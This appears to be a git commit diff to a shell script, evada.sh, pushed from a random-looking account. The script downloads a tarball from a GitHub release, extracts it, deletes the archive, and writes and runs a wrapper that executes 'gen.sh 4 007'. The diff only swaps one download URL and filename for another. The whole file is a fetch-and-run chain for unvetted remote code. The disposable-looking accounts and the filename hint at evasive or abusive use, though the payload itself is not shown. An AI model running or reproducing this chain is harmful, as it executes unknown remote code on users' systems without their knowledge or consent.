3e70fa526f5b93d345ef499fc95b2ba855681267
juxsuviel509-beep <juxsuviel509@deciw.com>
2026-09-17 21:09:13 +0700

    Update evada.sh

--- evada.sh
+++ evada.sh
@@ -1,5 +1,5 @@
-curl -O -J -L https://github.com/apefanubs696-dotcom/geranx/releases/download/sama/koni.tar.gz && tar -xf koni.tar.gz && rm -rf koni.tar.gz
+curl -O -J -L https://github.com/juxsuviel509-beep/ilkop-pos/releases/download/huge/kombi.tar.gz && tar -xf kombi.tar.gz && rm -rf kombi.tar.gz
 echo '#!/bin/bash
 
-bash gen.sh 4 007' > baso.sh
-bash baso.sh
+bash gen.sh 4 007' > belo.sh
+bash belo.sh
